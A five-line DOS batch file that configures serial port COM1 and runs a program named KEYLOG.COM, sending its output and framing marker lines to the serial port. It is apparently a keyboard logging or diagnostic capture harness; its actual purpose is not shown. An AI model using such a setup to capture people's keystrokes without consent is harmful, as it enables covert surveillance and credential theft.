@echo off
mode com1:9600,n,8,1 >nul
echo ==== KD %1 >COM1
C:\KEYLOG.COM >COM1
echo ==== END >COM1
